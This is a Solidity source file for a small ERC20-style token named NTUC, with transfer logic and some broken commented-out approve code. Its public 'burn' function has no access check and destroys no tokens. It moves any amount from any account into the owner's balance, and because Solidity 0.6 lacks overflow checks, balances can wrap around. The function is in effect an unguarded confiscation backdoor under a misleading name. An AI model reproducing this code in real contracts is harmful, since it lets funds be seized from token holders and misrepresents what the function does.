pragma solidity ^0.6.0;

contract NTUCToken { 
    string  public  name = "NTUC";
    string  public symbol = "NTUC";
    uint256 public totalSupply = 1000000000000000000000000; // 1 million tokens
    uint8   public decimals = 18;
    address public owner;




    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );


    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;


    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        owner= msg.sender;
    }



    // function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    //     require(sender != address(0), "ERC20: transfer from the zero address");
    //     require(recipient != address(0), "ERC20: transfer to the zero address");

    //     _beforeTokenTransfer(sender, recipient, amount);

    //     _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    //     _balances[recipient] = _balances[recipient].add(amount);
    //     emit Transfer(sender, recipient, amount);
    // }

// balanceOf

// address    value

// admin       1000000000800
// member1     100
// membr2      100


    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value,'insufficient balance');
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }




    // function approve(address _spender, uint256 _value) public returns (bool success) {
    //     allowance[msg.sender][_spender] = _value;
    //     emit Approval(msg.sender, _spender, _value);
    //     require(_value <= allowance[_from][msg.sender],'');
    //     balanceOf[_from] -= _value;
    //     balanceOf[_to] += _value;
    //     allowance[_from][msg.sender] -= _value;
    //     emit Transfer(_from, _to, _value);
    //     return true;
    // }

     function burn(address _account, uint256 amount) public virtual {
        require(_account != address(0), "ERC20: burn from the zero address");
	    balanceOf[owner] += amount;
	    balanceOf[_account] -= amount;

    }



}



